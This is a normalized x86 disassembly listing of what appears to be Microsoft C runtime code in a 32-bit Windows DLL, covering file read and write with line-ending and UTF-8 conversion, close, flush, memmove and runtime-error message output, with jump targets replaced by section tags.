jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1001034f
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_100184c3
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_100184c3
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_100184c3
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_10012e34
push 0x10
push r--data
call sub_10011e54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_10010362
and [ eax ] 0x0
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] esi
call sub_1001034f
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_10011e99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_100198e9
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_10010362
mov [ eax ] esi
call sub_1001034f
mov [ eax ] 0x16
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012872
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100102e7
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10012f27
mov eax [ ebp - 0x1c ]
sub_10012f31
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_10012f63
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_1001034f
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_1000ebe0
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10013da0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1001034f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
mov eax esi
jmp r-xdata
sub_10012fe0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_10013081
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10019872
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_10010375
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10019872
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10019872
push 0x1
mov edi eax
call sub_10019872
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_100197ec
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1001311d
push 0x10
push r--data
call sub_10011e54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10010362
and [ eax ] 0x0
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] edi
call sub_1001034f
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011e99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100198e9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1001034f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10013081
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100131e0
mov eax [ ebp - 0x1c ]
sub_100131ea
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1000c3e9
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10013220
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10013288
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_10019ec2
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_10019ec2
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_10014870
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_1001830b
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100101bf
add esp 0x14
push esi
call sub_10014870
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_1001830b
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_10014870
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_10018256
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100101bf
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_10018198
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100101bf
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_100101bf
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_10019d59
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100101bf
add esp 0x14
push r--data
push ebx
push edi
call sub_10018198
add esp 0xc
test eax eax
je r-xdata
sub_10013433
push 0x3
call sub_10019ec2
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10013288
push 0xff
call sub_10013288
pop ecx
pop ecx
push 0x3
call sub_10019ec2
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1001347b
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1000fb0b
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_100134a3
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_1001a110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_10010362
mov [ eax ] esi
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000c176
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_10010362
xor esi esi
mov [ eax ] esi
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100186aa
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_100184c3
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_1000fd57
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x1c
call sub_10010362
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_10010375
pop ecx
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_100183f8
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_10019f0d
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_1001a0e9
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_1001a0e9
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_10019f0d
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_10013bd6
push 0x10
push r--data
call sub_10011e54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10010362
and [ eax ] 0x0
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] edi
call sub_1001034f
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011e99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100198e9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100134a3
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013ca8
mov eax [ ebp - 0x1c ]
sub_10013cb2
push 0x10
push r--data
call sub_10011e54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_1001034f
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100102e7
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011e99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100198e9
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1001034f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10019872
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013d89
mov eax [ ebp - 0x1c ]
call sub_10010362
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_10013da0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
